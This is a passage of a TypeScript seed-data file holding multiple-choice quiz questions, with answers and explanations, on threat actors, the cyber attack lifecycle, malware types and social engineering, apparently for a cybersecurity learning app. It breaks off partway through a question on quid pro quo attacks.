export interface SeedDomain {
  name: string;
  tier: number;
  description: string;
  prerequisites: string[];
  displayOrder: number;
}

export interface SeedTopic {
  name: string;
  complexityWeight: number;
  displayOrder: number;
}

export interface SeedNode {
  topicName: string;
  concept: string;
  questionTemplates: Array<{
    type: "recognition";
    prompt: string;
    choices: string[];
    correctAnswer: string;
    explanation: string;
  }>;
}

export const domain: SeedDomain = {
  name: "Threat Landscape",
  tier: 1,
  description:
    "Threat actors, attack lifecycle, malware types, social engineering, and vulnerability management",
  prerequisites: [],
  displayOrder: 10,
};

export const topics: SeedTopic[] = [
  {
    name: "Threat Actors",
    complexityWeight: 1.0,
    displayOrder: 0,
  },
  {
    name: "Attack Lifecycle",
    complexityWeight: 1.2,
    displayOrder: 1,
  },
  {
    name: "Malware Types",
    complexityWeight: 1.1,
    displayOrder: 2,
  },
  {
    name: "Social Engineering",
    complexityWeight: 1.0,
    displayOrder: 3,
  },
  {
    name: "Web Application Threats",
    complexityWeight: 1.3,
    displayOrder: 4,
  },
  {
    name: "CVE & CVSS",
    complexityWeight: 1.2,
    displayOrder: 5,
  },
  {
    name: "Supply Chain Attacks",
    complexityWeight: 1.4,
    displayOrder: 6,
  },
  {
    name: "Current Threat Trends",
    complexityWeight: 1.3,
    displayOrder: 7,
  },
];

export const nodes: SeedNode[] = [
  // ─── Threat Actors (13 nodes) ───

  {
    topicName: "Threat Actors",
    concept: "Nation-state actors",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Which type of threat actor is typically backed by a government and conducts cyber espionage or sabotage against other nations?",
        choices: [
          "Nation-state actor",
          "Script kiddie",
          "Hacktivist",
          "Insider threat",
        ],
        correctAnswer: "Nation-state actor",
        explanation:
          "Nation-state actors are government-sponsored groups that conduct sophisticated cyber operations including espionage, intellectual property theft, and critical infrastructure disruption. They are among the most well-resourced and persistent threat actors.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Hacktivists",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A group defaces a corporation's website to protest its environmental policies. What type of threat actor best describes this group?",
        choices: [
          "Hacktivist",
          "Nation-state actor",
          "Organized crime group",
          "Insider threat",
        ],
        correctAnswer: "Hacktivist",
        explanation:
          "Hacktivists are individuals or groups who use hacking techniques to promote a political or social agenda. Common tactics include website defacement, DDoS attacks, and data leaks intended to embarrass or pressure their targets.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Organized cybercrime",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A criminal syndicate deploys ransomware across hospitals to extort large payments. What type of threat actor is this?",
        choices: [
          "Organized cybercrime group",
          "Hacktivist",
          "Script kiddie",
          "Nation-state actor",
        ],
        correctAnswer: "Organized cybercrime group",
        explanation:
          "Organized cybercrime groups operate like businesses, motivated primarily by financial gain. They use sophisticated tools and services (ransomware-as-a-service, bulletproof hosting) and often target high-value sectors like healthcare and finance.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Script kiddies",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An unskilled individual uses pre-built hacking tools downloaded from the internet to attack a website without understanding how they work. What term describes this attacker?",
        choices: [
          "Script kiddie",
          "Advanced persistent threat",
          "Nation-state actor",
          "Insider threat",
        ],
        correctAnswer: "Script kiddie",
        explanation:
          "Script kiddies are inexperienced attackers who rely on existing tools and scripts created by others. While they lack technical sophistication, they can still cause damage due to the availability of powerful automated attack tools.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Insider threats",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A disgruntled employee copies sensitive customer data to a personal USB drive before resigning. What type of threat does this represent?",
        choices: [
          "Insider threat",
          "Advanced persistent threat",
          "Hacktivist",
          "Script kiddie",
        ],
        correctAnswer: "Insider threat",
        explanation:
          "Insider threats come from individuals within the organization — employees, contractors, or partners — who misuse their authorized access. They can be malicious (intentional) or negligent (accidental) and are especially dangerous because they bypass many external security controls.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Advanced persistent threats (APTs)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What distinguishes an advanced persistent threat (APT) from other threat actors?",
        choices: [
          "APTs maintain prolonged, stealthy access to a network to achieve long-term objectives",
          "APTs only target small businesses with weak security",
          "APTs exclusively use zero-day exploits for every attack",
          "APTs never use social engineering techniques",
        ],
        correctAnswer:
          "APTs maintain prolonged, stealthy access to a network to achieve long-term objectives",
        explanation:
          "APTs are characterized by their sophistication, persistence, and stealth. They often establish footholds in target networks and remain undetected for months or years, exfiltrating data or positioning for future operations. Many APTs are associated with nation-states.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Threat actor motivations",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Which motivation is most commonly associated with organized cybercrime groups?",
        choices: [
          "Financial gain",
          "Political activism",
          "National security objectives",
          "Personal curiosity",
        ],
        correctAnswer: "Financial gain",
        explanation:
          "Organized cybercrime is driven primarily by profit. Revenue streams include ransomware payments, selling stolen credit card data, business email compromise fraud, and operating underground marketplaces for stolen credentials and exploit kits.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Threat actor capabilities",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Which threat actor category typically has the highest level of technical capability and resources?",
        choices: [
          "Nation-state actors",
          "Script kiddies",
          "Hacktivists",
          "Lone-wolf hackers",
        ],
        correctAnswer: "Nation-state actors",
        explanation:
          "Nation-state actors have access to government funding, dedicated research teams, and intelligence agencies. They can develop custom malware, discover zero-day vulnerabilities, and conduct operations over months or years with minimal detection.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Cyber mercenaries",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What term describes private companies or individuals that sell offensive hacking services to governments or other clients?",
        choices: [
          "Cyber mercenaries (hack-for-hire)",
          "Bug bounty hunters",
          "Penetration testers",
          "Security researchers",
        ],
        correctAnswer: "Cyber mercenaries (hack-for-hire)",
        explanation:
          "Cyber mercenaries are private entities that offer offensive cyber capabilities for hire, including surveillance tools, exploit development, and targeted intrusion services. Unlike ethical penetration testers, their activities often target dissidents, journalists, or rival organizations.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Threat intelligence",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the primary purpose of cyber threat intelligence (CTI)?",
        choices: [
          "To collect and analyze information about current and potential threats to inform defensive decisions",
          "To launch offensive attacks against threat actors",
          "To sell vulnerability information on the dark web",
          "To replace the need for security controls like firewalls",
        ],
        correctAnswer:
          "To collect and analyze information about current and potential threats to inform defensive decisions",
        explanation:
          "Cyber threat intelligence involves gathering, analyzing, and disseminating information about threat actors, their tactics, techniques, and procedures (TTPs), and indicators of compromise (IOCs). It enables proactive defense and informed decision-making.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Indicators of compromise (IOCs)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Which of the following is an example of an indicator of compromise (IOC)?",
        choices: [
          "A known malicious IP address found in firewall logs",
          "A company's annual revenue report",
          "The number of employees in the IT department",
          "A software vendor's release notes",
        ],
        correctAnswer: "A known malicious IP address found in firewall logs",
        explanation:
          "IOCs are forensic artifacts that indicate a potential security breach, such as malicious IP addresses, file hashes of known malware, suspicious domain names, or unusual registry changes. They are used to detect and respond to intrusions.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "Tactics, techniques, and procedures (TTPs)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "In threat intelligence, what do TTPs (Tactics, Techniques, and Procedures) describe?",
        choices: [
          "The behavior patterns and methods used by threat actors to conduct attacks",
          "The legal terms and conditions for cybersecurity insurance policies",
          "The technical specifications of firewall hardware",
          "The training programs required for security certification",
        ],
        correctAnswer:
          "The behavior patterns and methods used by threat actors to conduct attacks",
        explanation:
          "TTPs describe how threat actors operate: tactics are the high-level goals (e.g., initial access), techniques are the methods used to achieve those goals (e.g., spear phishing), and procedures are the specific implementations. The MITRE ATT&CK framework is a widely used TTP knowledge base.",
      },
    ],
  },
  {
    topicName: "Threat Actors",
    concept: "MITRE ATT&CK framework",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the MITRE ATT&CK framework primarily used for?",
        choices: [
          "Cataloging adversary tactics and techniques based on real-world observations",
          "Encrypting sensitive data at rest and in transit",
          "Managing software development project timelines",
          "Calculating the financial impact of security breaches",
        ],
        correctAnswer:
          "Cataloging adversary tactics and techniques based on real-world observations",
        explanation:
          "MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary behavior. It organizes TTPs into a matrix of tactics (columns) and techniques (rows) and is used for threat modeling, detection engineering, and red team planning.",
      },
    ],
  },

  // ─── Attack Lifecycle (13 nodes) ───

  {
    topicName: "Attack Lifecycle",
    concept: "Cyber Kill Chain overview",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "The Cyber Kill Chain, developed by Lockheed Martin, describes what?",
        choices: [
          "The sequential phases of a cyberattack from reconnaissance to actions on objectives",
          "A method for encrypting military communications",
          "A list of all known malware variants sorted by severity",
          "The organizational hierarchy of a cybersecurity team",
        ],
        correctAnswer:
          "The sequential phases of a cyberattack from reconnaissance to actions on objectives",
        explanation:
          "The Cyber Kill Chain is a framework that models the stages of a cyberattack: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, and Actions on Objectives. Defenders can use it to identify and disrupt attacks at each phase.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Reconnaissance",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker searches LinkedIn to identify employees at a target company and uses WHOIS lookups to find the company's IP address ranges. Which phase of the Cyber Kill Chain is this?",
        choices: [
          "Reconnaissance",
          "Weaponization",
          "Delivery",
          "Exploitation",
        ],
        correctAnswer: "Reconnaissance",
        explanation:
          "Reconnaissance is the first phase where attackers gather information about their target. This can be passive (OSINT, public records, social media) or active (port scanning, vulnerability scanning). The goal is to identify attack vectors and potential weaknesses.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Weaponization",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker creates a malicious PDF that exploits a known vulnerability in a document reader. Which phase of the Cyber Kill Chain does this represent?",
        choices: [
          "Weaponization",
          "Reconnaissance",
          "Delivery",
          "Installation",
        ],
        correctAnswer: "Weaponization",
        explanation:
          "Weaponization is the phase where attackers create or modify a payload (malware, exploit) to target a specific vulnerability identified during reconnaissance. The attacker pairs an exploit with a backdoor into a deliverable payload, such as a malicious document or link.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Delivery",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker sends a spear-phishing email with a malicious attachment to an employee at the target organization. Which phase of the Cyber Kill Chain is this?",
        choices: [
          "Delivery",
          "Reconnaissance",
          "Weaponization",
          "Exploitation",
        ],
        correctAnswer: "Delivery",
        explanation:
          "Delivery is the phase where the weaponized payload is transmitted to the target. Common delivery methods include phishing emails, malicious websites (watering holes), USB drops, and compromised software updates. Email remains the most common delivery vector.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Exploitation",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "When a user opens a malicious attachment and the embedded exploit code triggers a buffer overflow in the application, which phase of the Cyber Kill Chain is occurring?",
        choices: [
          "Exploitation",
          "Delivery",
          "Installation",
          "Command and Control",
        ],
        correctAnswer: "Exploitation",
        explanation:
          "Exploitation is the phase where the attacker's code actually executes on the victim's system by taking advantage of a vulnerability. This can target software flaws, misconfigurations, or human weaknesses. Patching and input validation are primary defenses.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Installation",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "After gaining initial code execution, an attacker installs a persistent backdoor on the compromised system. Which phase of the Cyber Kill Chain is this?",
        choices: [
          "Installation",
          "Exploitation",
          "Command and Control",
          "Actions on Objectives",
        ],
        correctAnswer: "Installation",
        explanation:
          "Installation is the phase where the attacker establishes persistence on the victim's system, ensuring continued access even after reboots. Techniques include installing web shells, modifying startup scripts, creating scheduled tasks, or adding registry keys.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Command and Control (C2)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Malware on a compromised system sends encrypted beacons to a remote server to receive instructions. Which phase of the Cyber Kill Chain does this represent?",
        choices: [
          "Command and Control (C2)",
          "Installation",
          "Exploitation",
          "Actions on Objectives",
        ],
        correctAnswer: "Command and Control (C2)",
        explanation:
          "The Command and Control (C2) phase establishes a communication channel between the attacker and the compromised system. Attackers use C2 to issue commands, exfiltrate data, and deploy additional tools. C2 traffic often uses encrypted HTTP/HTTPS or DNS tunneling to evade detection.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Actions on objectives",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker who has maintained access to a network for weeks begins exfiltrating sensitive intellectual property. Which phase of the Cyber Kill Chain is this?",
        choices: [
          "Actions on Objectives",
          "Command and Control",
          "Installation",
          "Reconnaissance",
        ],
        correctAnswer: "Actions on Objectives",
        explanation:
          "Actions on Objectives is the final phase where the attacker accomplishes their goal: data exfiltration, data destruction, ransomware deployment, espionage, or disruption of services. The specific action depends on the attacker's motivation.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Lateral movement",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "After compromising a single workstation, an attacker uses stolen credentials to access other systems on the same network. What is this technique called?",
        choices: [
          "Lateral movement",
          "Reconnaissance",
          "Weaponization",
          "Delivery",
        ],
        correctAnswer: "Lateral movement",
        explanation:
          "Lateral movement is the process of moving through a network from the initially compromised system to other systems, escalating access and looking for high-value targets. Techniques include pass-the-hash, remote desktop, and exploiting trust relationships between systems.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Privilege escalation",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker who gained access as a low-privileged user exploits a kernel vulnerability to gain root access on the system. What is this technique called?",
        choices: [
          "Privilege escalation",
          "Lateral movement",
          "Reconnaissance",
          "Data exfiltration",
        ],
        correctAnswer: "Privilege escalation",
        explanation:
          "Privilege escalation is the act of gaining higher-level permissions than originally granted. Vertical escalation moves from a lower to a higher privilege level (e.g., user to admin). Horizontal escalation accesses resources of another user at the same privilege level.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Data exfiltration",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker compresses and encrypts stolen files, then transmits them to an external server over DNS tunneling. What is this activity called?",
        choices: [
          "Data exfiltration",
          "Data masking",
          "Data deduplication",
          "Data normalization",
        ],
        correctAnswer: "Data exfiltration",
        explanation:
          "Data exfiltration is the unauthorized transfer of data from an organization's network. Attackers often use covert channels like DNS tunneling, steganography, or encrypted HTTPS to avoid detection by data loss prevention (DLP) systems.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Persistence mechanisms",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker modifies the Windows Registry to ensure their malware runs every time the system boots. What is this technique an example of?",
        choices: [
          "Persistence",
          "Reconnaissance",
          "Delivery",
          "Weaponization",
        ],
        correctAnswer: "Persistence",
        explanation:
          "Persistence mechanisms allow attackers to maintain access to a compromised system across reboots, credential changes, and other disruptions. Common techniques include registry run keys, scheduled tasks, startup folders, boot record modification, and implanting web shells.",
      },
    ],
  },
  {
    topicName: "Attack Lifecycle",
    concept: "Defense evasion",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker uses fileless malware that runs entirely in memory and uses legitimate system tools to avoid triggering antivirus alerts. What category of technique is this?",
        choices: [
          "Defense evasion",
          "Initial access",
          "Credential access",
          "Impact",
        ],
        correctAnswer: "Defense evasion",
        explanation:
          "Defense evasion encompasses techniques attackers use to avoid detection by security controls. Examples include fileless malware, code obfuscation, disabling security software, timestomping, and living-off-the-land (using legitimate tools like PowerShell for malicious purposes).",
      },
    ],
  },

  // ─── Malware Types (13 nodes) ───

  {
    topicName: "Malware Types",
    concept: "Viruses",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Which type of malware attaches itself to a legitimate program and spreads when the infected program is executed?",
        choices: [
          "Virus",
          "Worm",
          "Trojan",
          "Rootkit",
        ],
        correctAnswer: "Virus",
        explanation:
          "A virus is malicious code that attaches to a host program and replicates when the host is executed. Unlike worms, viruses require user action (running the infected program) to spread. They can corrupt files, steal data, or render systems inoperable.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Worms",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Which type of malware can replicate and spread across a network without any user interaction?",
        choices: [
          "Worm",
          "Virus",
          "Trojan",
          "Adware",
        ],
        correctAnswer: "Worm",
        explanation:
          "Worms are self-replicating malware that spread autonomously across networks by exploiting vulnerabilities, without requiring a host program or user action. Notable examples include WannaCry, Conficker, and Stuxnet. They can rapidly consume bandwidth and overwhelm systems.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Trojans",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A user downloads what appears to be a free antivirus tool, but it secretly installs a backdoor on their system. What type of malware is this?",
        choices: [
          "Trojan",
          "Worm",
          "Virus",
          "Ransomware",
        ],
        correctAnswer: "Trojan",
        explanation:
          "A Trojan (or Trojan horse) disguises itself as legitimate software to trick users into installing it. Unlike viruses and worms, Trojans do not self-replicate. Once installed, they can create backdoors, steal credentials, or download additional malware.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Ransomware",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What distinguishes ransomware from other types of malware?",
        choices: [
          "It encrypts the victim's data and demands payment for the decryption key",
          "It silently monitors the user's keystrokes",
          "It replicates itself across the network without user interaction",
          "It only targets mobile devices",
        ],
        correctAnswer:
          "It encrypts the victim's data and demands payment for the decryption key",
        explanation:
          "Ransomware encrypts files or locks systems and demands a ransom, typically in cryptocurrency. Modern variants also exfiltrate data before encryption (double extortion) and threaten to publish it. Notable families include LockBit, BlackCat, and Clop.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Rootkits",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Which type of malware is specifically designed to hide its presence and other malicious activities from the operating system and security tools?",
        choices: [
          "Rootkit",
          "Adware",
          "Spyware",
          "Worm",
        ],
        correctAnswer: "Rootkit",
        explanation:
          "Rootkits modify the operating system or firmware to conceal their presence and the presence of other malware. They can intercept system calls, hide files and processes, and are extremely difficult to detect and remove. Kernel-level rootkits operate at the OS kernel level.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Spyware",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Malware that secretly collects information about a user's activities, including browsing habits and keystrokes, and sends it to a third party is called what?",
        choices: [
          "Spyware",
          "Adware",
          "Ransomware",
          "Rootkit",
        ],
        correctAnswer: "Spyware",
        explanation:
          "Spyware covertly monitors user activity, collecting sensitive information such as keystrokes, browsing history, login credentials, and financial data. It operates silently in the background and transmits collected data to the attacker.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Keyloggers",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker captures every keystroke typed on a victim's computer, including passwords and credit card numbers. What type of tool is the attacker using?",
        choices: [
          "Keylogger",
          "Port scanner",
          "Packet sniffer",
          "Firewall",
        ],
        correctAnswer: "Keylogger",
        explanation:
          "Keyloggers record every keystroke made on a device, capturing passwords, messages, and other sensitive input. They can be software-based (installed as malware) or hardware-based (physical devices attached between the keyboard and computer).",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Botnets",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A network of thousands of compromised computers controlled remotely by an attacker to launch coordinated attacks is called what?",
        choices: [
          "Botnet",
          "Honeypot",
          "Sandbox",
          "VPN",
        ],
        correctAnswer: "Botnet",
        explanation:
          "A botnet is a collection of compromised devices (bots or zombies) controlled by an attacker (botmaster) through a command-and-control infrastructure. Botnets are used for DDoS attacks, spam distribution, credential stuffing, and cryptocurrency mining.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Fileless malware",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What makes fileless malware particularly difficult to detect with traditional antivirus software?",
        choices: [
          "It operates entirely in memory and uses legitimate system tools, leaving no files on disk",
          "It encrypts itself with a different key on every system",
          "It only runs during system startup",
          "It targets exclusively Linux operating systems",
        ],
        correctAnswer:
          "It operates entirely in memory and uses legitimate system tools, leaving no files on disk",
        explanation:
          "Fileless malware resides in RAM rather than on disk and leverages legitimate system tools like PowerShell, WMI, or macros. Since traditional antivirus relies on scanning files, fileless malware evades detection. Behavioral analysis and memory forensics are needed to identify it.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Remote access Trojans (RATs)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker installs malware that gives them full remote control over a victim's computer, including access to the webcam, file system, and command shell. What type of malware is this?",
        choices: [
          "Remote Access Trojan (RAT)",
          "Adware",
          "Ransomware",
          "Worm",
        ],
        correctAnswer: "Remote Access Trojan (RAT)",
        explanation:
          "A RAT provides the attacker with comprehensive remote control over the victim's system, often including screen capture, file management, keystroke logging, and webcam/microphone access. RATs are commonly delivered through phishing emails or trojanized software.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Cryptominers",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A server's CPU usage unexpectedly spikes to 100% and remains there. Investigation reveals unauthorized software mining cryptocurrency. What type of malware is this?",
        choices: [
          "Cryptominer (cryptojacker)",
          "Ransomware",
          "Keylogger",
          "Rootkit",
        ],
        correctAnswer: "Cryptominer (cryptojacker)",
        explanation:
          "Cryptominers (or cryptojackers) hijack a victim's computing resources to mine cryptocurrency for the attacker. They can be delivered as malware or run in web browsers via malicious JavaScript. Symptoms include high CPU usage, overheating, and degraded system performance.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Wipers",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Malware designed to permanently destroy data on infected systems, with no mechanism for recovery or ransom payment, is known as what?",
        choices: [
          "Wiper",
          "Ransomware",
          "Spyware",
          "Adware",
        ],
        correctAnswer: "Wiper",
        explanation:
          "Wipers are destructive malware designed to irreversibly erase or corrupt data on target systems. Unlike ransomware, there is no decryption key or ransom demand. Wipers like NotPetya and WhisperGate have been used in geopolitical conflicts to cause maximum disruption.",
      },
    ],
  },
  {
    topicName: "Malware Types",
    concept: "Polymorphic malware",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Malware that changes its code each time it replicates, making signature-based detection extremely difficult, is described as what?",
        choices: [
          "Polymorphic malware",
          "Fileless malware",
          "Adware",
          "Scareware",
        ],
        correctAnswer: "Polymorphic malware",
        explanation:
          "Polymorphic malware uses encryption and code mutation to alter its appearance with each iteration while retaining its core functionality. This defeats signature-based antivirus because no two copies look identical. Heuristic and behavioral analysis are needed to detect it.",
      },
    ],
  },

  // ─── Social Engineering (13 nodes) ───

  {
    topicName: "Social Engineering",
    concept: "Phishing",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What type of social engineering attack sends fraudulent emails to large numbers of people, impersonating a trusted entity to steal credentials or deliver malware?",
        choices: [
          "Phishing",
          "Tailgating",
          "Dumpster diving",
          "Shoulder surfing",
        ],
        correctAnswer: "Phishing",
        explanation:
          "Phishing is the most common social engineering attack, using deceptive emails that appear to come from legitimate sources. Attackers cast a wide net, hoping some recipients will click malicious links or provide sensitive information. It remains the leading initial access vector for cyberattacks.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Spear phishing",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "How does spear phishing differ from regular phishing?",
        choices: [
          "Spear phishing targets specific individuals or organizations with personalized messages",
          "Spear phishing uses only phone calls instead of emails",
          "Spear phishing attacks are always automated with no human involvement",
          "Spear phishing only targets mobile devices",
        ],
        correctAnswer:
          "Spear phishing targets specific individuals or organizations with personalized messages",
        explanation:
          "Spear phishing is a targeted form of phishing where the attacker researches the victim and crafts a personalized message referencing specific details (job role, colleagues, recent activities). This personalization dramatically increases the success rate compared to generic phishing.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Whaling",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A sophisticated phishing email specifically targeting the CEO of a company, referencing a pending board meeting, is an example of what?",
        choices: [
          "Whaling",
          "Vishing",
          "Smishing",
          "Tailgating",
        ],
        correctAnswer: "Whaling",
        explanation:
          "Whaling is a form of spear phishing that targets high-profile individuals such as C-suite executives, board members, or other senior leaders. The high value of these targets justifies the attacker's investment in detailed research and convincing impersonation.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Vishing",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker calls a victim pretending to be from their bank's fraud department and asks them to verify their account number and PIN. What type of attack is this?",
        choices: [
          "Vishing (voice phishing)",
          "Smishing",
          "Pharming",
          "Watering hole attack",
        ],
        correctAnswer: "Vishing (voice phishing)",
        explanation:
          "Vishing (voice phishing) uses phone calls to manipulate victims into revealing sensitive information or performing actions that benefit the attacker. Caller ID spoofing makes vishing more convincing by displaying a trusted phone number.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Smishing",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A user receives a text message claiming their package delivery failed and asking them to click a link to reschedule. The link leads to a credential harvesting site. What type of attack is this?",
        choices: [
          "Smishing (SMS phishing)",
          "Vishing",
          "Whaling",
          "Pharming",
        ],
        correctAnswer: "Smishing (SMS phishing)",
        explanation:
          "Smishing uses SMS text messages to trick victims into clicking malicious links or providing sensitive information. Smishing exploits the trust people place in text messages and the limited URL preview available on mobile devices.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Pretexting",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker creates a fabricated scenario, posing as a vendor conducting a survey, to manipulate an employee into disclosing internal network information. What social engineering technique is this?",
        choices: [
          "Pretexting",
          "Baiting",
          "Tailgating",
          "Phishing",
        ],
        correctAnswer: "Pretexting",
        explanation:
          "Pretexting involves creating a fabricated scenario (pretext) to engage the victim and extract information or gain access. The attacker assumes a false identity and builds trust through a convincing backstory, often impersonating authority figures, co-workers, or service providers.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Baiting",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker leaves malware-infected USB drives in a company parking lot, hoping employees will plug them into their work computers. What social engineering technique is this?",
        choices: [
          "Baiting",
          "Pretexting",
          "Vishing",
          "Shoulder surfing",
        ],
        correctAnswer: "Baiting",
        explanation:
          "Baiting exploits curiosity or greed by offering something enticing — such as a USB drive labeled 'Salary Information' or free software — that contains malware. When the victim takes the bait, the malware is executed on their system.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Tailgating and piggybacking",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An unauthorized person follows an employee through a secure door by walking closely behind them before the door closes. What is this technique called?",
        choices: [
          "Tailgating",
          "Phishing",
          "Pretexting",
          "Dumpster diving",
        ],
        correctAnswer: "Tailgating",
        explanation:
          "Tailgating (or piggybacking) is a physical social engineering technique where an unauthorized person gains access to a restricted area by following closely behind an authorized person. Anti-tailgating measures include mantraps, turnstiles, and security awareness training.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Watering hole attacks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker compromises a website frequently visited by employees of a target organization, embedding malware that infects visitors. What type of attack is this?",
        choices: [
          "Watering hole attack",
          "Brute force attack",
          "Man-in-the-middle attack",
          "SQL injection",
        ],
        correctAnswer: "Watering hole attack",
        explanation:
          "A watering hole attack compromises a third-party website that the target group is known to visit. The attacker injects malicious code into the site, which infects visitors from the target organization. It is named after predators that ambush prey at watering holes.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Business email compromise (BEC)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker spoofs or compromises a CEO's email account and sends a message to the finance department requesting an urgent wire transfer to a fraudulent account. What type of attack is this?",
        choices: [
          "Business Email Compromise (BEC)",
          "Distributed Denial of Service (DDoS)",
          "SQL injection",
          "Cross-site scripting",
        ],
        correctAnswer: "Business Email Compromise (BEC)",
        explanation:
          "BEC is a targeted scam where attackers impersonate executives or trusted business partners via email to trick employees into transferring funds or sharing sensitive data. BEC has caused billions of dollars in losses globally and relies heavily on social engineering rather than technical exploits.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Shoulder surfing",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker observes a user typing their password by looking over their shoulder at a coffee shop. What social engineering technique is this?",
        choices: [
          "Shoulder surfing",
          "Dumpster diving",
          "Tailgating",
          "Pretexting",
        ],
        correctAnswer: "Shoulder surfing",
        explanation:
          "Shoulder surfing involves directly observing someone entering sensitive information such as passwords, PINs, or security codes. Countermeasures include privacy screens, awareness of surroundings, and biometric authentication that does not require visible input.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Quid pro quo attacks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker calls random employees offering free technical support in exchange for their login credentials. What social engineering technique is this?",
        choices: [
          "Quid pro quo",
          "Baiting",
          "Pharming",
          "Watering hole",
        ],
        correctAnswer: "Quid pro quo",
        explanation:
